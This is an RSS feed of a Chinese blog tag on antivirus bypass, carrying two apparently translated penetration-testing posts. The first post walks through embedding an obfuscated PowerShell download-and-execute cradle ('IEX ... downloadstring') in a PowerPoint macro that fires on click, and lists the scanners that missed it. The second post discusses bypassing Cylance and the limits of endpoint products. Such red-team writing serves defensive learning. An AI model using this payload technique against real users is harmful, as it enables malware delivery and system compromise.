<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>反病毒绕过 on 办公AI智能小助手</title>
        <link>http://localhost:1313/tags/%E5%8F%8D%E7%97%85%E6%AF%92%E7%BB%95%E8%BF%87/</link>
        <description>Recent content in 反病毒绕过 on 办公AI智能小助手</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>qife</copyright>
        <lastBuildDate>Sat, 02 Aug 2025 06:38:38 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E5%8F%8D%E7%97%85%E6%AF%92%E7%BB%95%E8%BF%87/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>利用Veil-Evasion绕过杀毒软件检测的C2通信技术</title>
        <link>http://localhost:1313/p/%E5%88%A9%E7%94%A8veil-evasion%E7%BB%95%E8%BF%87%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6%E6%A3%80%E6%B5%8B%E7%9A%84c2%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/</link>
        <pubDate>Sat, 02 Aug 2025 06:38:38 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%88%A9%E7%94%A8veil-evasion%E7%BB%95%E8%BF%87%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6%E6%A3%80%E6%B5%8B%E7%9A%84c2%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/</guid>
        <description>&lt;h1 id=&#34;点击启用内容---绕过杀毒检测的c2通信技术&#34;&gt;点击启用内容 - 绕过杀毒检测的C2通信技术
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;：本文所述技术可能已过时，但仍可作为学习现代工具技术演进的参考案例。&lt;/p&gt;
&lt;p&gt;在BHIS，绕过杀毒扫描已成为我们的&amp;quot;办公室运动&amp;quot;。在进行C2测试时，我们会从内网主机建立到C2服务器的反向连接，通过多种数据传递方式来测试防御系统的检测能力。我们的成功率很高（通常能成功外传数据），主要原因是恶意流量的识别极其困难——攻击者可以通过混淆技术使流量逃过杀毒软件和安全设备的检测。&lt;/p&gt;
&lt;h2 id=&#34;技术实现细节&#34;&gt;技术实现细节
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;监听器配置&lt;/strong&gt;&lt;br&gt;
在C2服务器设置443端口的反向TCP监听（选择443因其通常允许出站）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;载荷生成&lt;/strong&gt;&lt;br&gt;
使用Veil-Evasion工具生成混淆的PowerShell脚本载荷，该工具只需输入目标地址/端口及载荷类型即可自动生成代码。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;宏安全处理&lt;/strong&gt;&lt;br&gt;
原始生成的2300字符单行脚本会触发VB编辑器报错。通过&lt;code&gt;macro_safe.py&lt;/code&gt;脚本将长代码分割为VB可处理的片段：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# macro_safe.py处理示例&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 将长命令拆分为多行连接字符串&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;powershell -nop -w hidden -c &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;IEX ((new-object net.webclient).&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;downloadstring(&amp;#39;http://192.168.1.1/a&amp;#39;))&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;PPT宏植入&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将文档另存为&lt;code&gt;.pps&lt;/code&gt;（97-2003格式）避免&amp;quot;m&amp;quot;扩展名引起怀疑&lt;/li&gt;
&lt;li&gt;通过&amp;quot;开发工具&amp;quot;选项卡插入VB模块&lt;/li&gt;
&lt;li&gt;使用&amp;quot;鼠标点击&amp;quot;动作触发宏执行（覆盖整个首幻灯片的文本框）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;安全绕过实证&#34;&gt;安全绕过实证
&lt;/h2&gt;&lt;p&gt;测试扫描结果：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Gmail扫描器 ❌ 未检测&lt;/li&gt;
&lt;li&gt;Windows Defender ❌ 未检测&lt;/li&gt;
&lt;li&gt;McAfee ❌ 未检测&lt;/li&gt;
&lt;li&gt;Symantec ❌ 未检测&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;唯一防护是PowerPoint的主动内容警告，但用户往往因&amp;quot;错误消息疲劳&amp;quot;而忽略。这种技术揭示了单纯依赖杀毒软件的黑名单机制和用户教育的重要性。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;如果必须让用户做安全决策，就必须持续教育他们认识潜在危险。&amp;rdquo; —— BHIS团队&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>绕过Cylance防护：第五部分 - 未来展望</title>
        <link>http://localhost:1313/p/%E7%BB%95%E8%BF%87cylance%E9%98%B2%E6%8A%A4%E7%AC%AC%E4%BA%94%E9%83%A8%E5%88%86-%E6%9C%AA%E6%9D%A5%E5%B1%95%E6%9C%9B/</link>
        <pubDate>Fri, 01 Aug 2025 21:50:47 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E7%BB%95%E8%BF%87cylance%E9%98%B2%E6%8A%A4%E7%AC%AC%E4%BA%94%E9%83%A8%E5%88%86-%E6%9C%AA%E6%9D%A5%E5%B1%95%E6%9C%9B/</guid>
        <description>&lt;p&gt;我们刚刚完成了在前期项目中绕过Cylance防护的全过程演示。作为这个精彩系列的收官之作，我想分享几点关键观察。&lt;/p&gt;
&lt;p&gt;首先需要明确，作为渗透测试团队，我们只测试客户实际部署的环境，而非厂商指定的理想配置。尽管使用的技术非常基础（例如简单的脚本混淆和载荷拆分），但这些方法确实有效突破了防护——这本身就值得反思反病毒厂商的宣传话术。&lt;/p&gt;
&lt;p&gt;关于测试权限的争议值得关注。Cylance与CrowdStrike等厂商在用户协议中严格限制第三方测试的行为，这就像汽车厂商禁止媒体评测其产品般荒谬。必须说明的是，Cylance相比传统黑名单反病毒已有显著进步——在我们的测试中，它对某些高级威胁的检测确实展现了优势。&lt;/p&gt;
&lt;p&gt;白名单技术讨论是核心议题。虽然启用应用白名单（如通过AppLocker或SRP）能阻断我们90%的攻击路径，但这并非某个厂商的专利功能。问题在于企业往往因运维成本放弃启用这些功能，而厂商将未启用增强功能作为检测失败的借口并不合理。&lt;/p&gt;
&lt;p&gt;行业现状令人担忧：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;安全产品评测缺乏客观性（如NSS Labs报告存在明显缺陷）&lt;/li&gt;
&lt;li&gt;不存在&amp;quot;银弹&amp;quot;解决方案——Cylance宣称的AI预测攻击能力尚未经实践验证&lt;/li&gt;
&lt;li&gt;真正的安全需要架构级解决方案，包括应用白名单和出口流量管控&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;最后必须强调：部署任何高级端点防护产品都不是简单的&amp;quot;轻松按钮&amp;quot;。实施过程需要专业团队持续维护，否则防护效果将大打折扣。&lt;/p&gt;
&lt;p&gt;致谢：本系列技术实现基于Casey Smith和@_TacoRocket的前沿研究，推荐阅读Colby Farley的博客（https://pwningroot.com/）获取更多绕过技巧。&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
